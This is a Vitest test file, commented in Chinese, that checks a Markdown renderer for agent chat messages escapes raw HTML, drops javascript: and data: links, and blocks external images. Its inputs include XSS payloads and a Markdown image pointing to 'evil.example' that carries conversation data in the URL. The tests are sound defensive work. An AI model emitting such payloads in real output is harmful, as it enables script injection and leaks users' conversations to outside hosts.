import { describe, it, expect } from 'vitest'
import { useMarkdown } from '@/composables/useMarkdown'

/**
 * Markdown 是所有 Agent 消息的入口（助手正文、思考过程都走同一条渲染）。
 * 这里断言"渲染后的最终 HTML"具备哪些约束，而不是渲染器配置。
 */
describe('Markdown 输出安全', () => {
  const { render } = useMarkdown()

  it('原始 HTML 不被解释，只作为文本出现', () => {
    const out = render('<img src=x onerror="alert(1)"><script>alert(2)</script>')
    expect(out).not.toContain('<img')
    expect(out).not.toContain('<script')
    expect(out).toContain('&lt;script&gt;')
  })

  it('危险协议的链接不产生可点击的 href', () => {
    const out = render('[点我](javascript:alert(1))\n\n[再点](data:text/html;base64,PHNjcmlwdD4=)')
    expect(out).not.toMatch(/href="javascript:/i)
    expect(out).not.toMatch(/href="data:text\/html/i)
  })

  it('外链补上 noopener/noreferrer，且在新标签打开', () => {
    const out = render('[站外](https://example.com/a)')
    expect(out).toContain('href="https://example.com/a"')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
    expect(out).toContain('target="_blank"')
  })

  it('站内图片正常加载，且不携带 Referer', () => {
    const out = render('![图](/api/picture/content/1/preview)')
    expect(out).toContain('<img')
    expect(out).toContain('src="/api/picture/content/1/preview"')
    expect(out).toContain('referrerpolicy="no-referrer"')
  })

  it('未受控的外部图片根本不生成 img，从源头避免请求外发', () => {
    const out = render('![图](https://evil.example/tracker.png?conversation=secret)')
    expect(out).not.toContain('<img')
    expect(out).not.toContain('src="https://evil.example')
    // 用占位文本告知用户，而不是静默丢弃
    expect(out).toContain('图片未加载')
  })

  it('站内相对链接保持原样，导航不受影响', () => {
    const out = render('[详情](/picture/1)')
    expect(out).toContain('href="/picture/1"')
    expect(out).not.toContain('target="_blank"')
  })
})
